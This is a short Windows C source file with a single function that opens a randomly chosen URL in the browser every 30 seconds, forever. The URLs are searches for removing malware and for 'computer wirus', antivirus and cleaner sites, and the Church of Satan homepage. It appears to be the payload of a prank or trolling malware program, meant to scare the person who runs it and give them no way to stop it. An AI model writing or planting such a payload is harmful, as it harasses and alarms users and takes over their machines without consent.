#include <Windows.h>
#include <stdio.h>
#include <shellapi.h>

int OpenRandURL()
{
	char* urls[] = 
	{
		"https://www.google.com/search?q=how+to+remove+malware&rlz=1C1ONGR_enUS999US999&sxsrf=APq-WBv5A3dJ2fO2k5d_tThHQbmKP1LK_w%3A1649908451767&ei=45pXYtC7LsqUxc8Pn86x8A4&ved=0ahUKEwiQubf505L3AhVKSvEDHR9nDO4Q4dUDCA4&uact=5&oq=how+to+remove+malware&gs_lcp=Cgdnd3Mtd2l6EAMyCggAEIAEEIcCEBQyBQgAEIAEMgUIABCABDIFCAAQgAQyCggAEIAEEIcCEBQyBQgAEIAEMgUIABCABDIFCAAQgAQyBQgAEIAEMgUIABCABDoHCAAQRxCwAzoHCAAQsAMQQzoECCMQJzoECAAQQzoFCAAQkQI6CAgAEIAEELEDSgQIQRgASgQIRhgAUNcDWOglYPwoaAFwAXgAgAFwiAGkDpIBBDI3LjGYAQCgAQHIAQrAAQE&sclient=gws-wiz",
		"https://www.ccleaner.com/",
		"https://www.google.com/search?q=i+think+i+have+a+computer+wirus&rlz=1C1ONGR_enUS999US999&sxsrf=APq-WBsusvHoalcfvtSDMB6RoHh7FaP5IA%3A1649909023327&ei=H51XYpjSE8quytMPla69iAs&ved=0ahUKEwjY3fyJ1pL3AhVKl3IEHRVXD7EQ4dUDCA4&uact=5&oq=i+think+i+have+a+computer+wirus&gs_lcp=Cgdnd3Mtd2l6EAMyBAgAEA0yBggAEA0QHjIICAAQCBANEB4yBQgAEIYDOgcIABBHELADOgcIIxCwAhAnSgQIQRgASgQIRhgAUJwGWKEUYLIYaAFwAXgAgAFdiAGmBZIBATmYAQCgAQHIAQjAAQE&sclient=gws-wiz",
		"https://www.churchofsatan.com/",
		"https://www.avg.com/en/signal/how-to-get-rid-of-a-virus-or-malware-on-your-computer"
	};

	while (true)
	{
		ShellExecute(0, 0, urls[rand() % (sizeof(urls) / sizeof(urls[0]))], 0, 0, SW_SHOW);

		Sleep(30000);
	}

	return 0;
}